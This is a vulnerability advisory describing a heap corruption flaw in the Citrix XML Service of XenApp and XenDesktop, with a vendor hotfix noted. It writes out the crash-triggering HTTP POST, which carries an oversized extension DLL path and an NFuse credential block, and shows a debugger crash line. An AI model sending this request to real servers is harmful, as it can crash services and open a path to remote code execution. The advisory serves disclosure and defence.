Overview:

A heap corruption vulnerability has been found in the Citrix XML Service of
XenApp and XenDesktop which is installed on every server used for sharing
applications. Successful exploitation allows arbitrary code execution on the
server running the XML service.

Successful exploitation may allow arbitrary code execution on the server
running the XML service. The issue can be triggered with network access to
the system running the XML service.

Description:

The Citrix XML Service (ctxxmls.exe) is installed on every server used for
sharing applications. This windows service listens by default on port 80 and
can receive HTTP requests. Using HTTP POST requests with a URL starting with
the path /scripts/ it is possible to send messages to so called "HTTP
Extension DLLs" which consist of XML markup.

By sending a POST request to a really long non-existent extension DLL some
form of heap corruption can be triggered. A request of the following format
was sent:

POST /scripts/AAAAAAAAAA[...]AAAAAAAAA.dll HTTP/1.1
Content-Type: text/xml
Host: localhost:80
Content-Length: 1234
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE NFuseProtocol SYSTEM "NFuse.dtd">
<NFuseProtocol version="5.1">
<RequestValidateCredentials>
<Credentials>
<UserName>nruns</UserName>
<Password encoding="ctx1">MLBMMMAHNB</Password>
<Domain type="NT">TEST</Domain>
</Credentials>
</RequestValidateCredentials>
</NFuseProtocol

Around 122.222 'A' characters were sent in our tests which triggered the
heap corruption. But repeated tests showed that the observed behavior could
not be triggered reliably and sometimes needed multiple tries until a crash
was encountered.

The following Windbg output shows the observed crash of the XML service:

(b68.1020): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.

Impact:

The exploitability of this issue was not verified but it is to be expected
that it can be exploited reliably with more time investments which would
then lead to arbitrary remote code execution.

Solution:

Citrix issued a hotfix for this issue which can be found at [2].
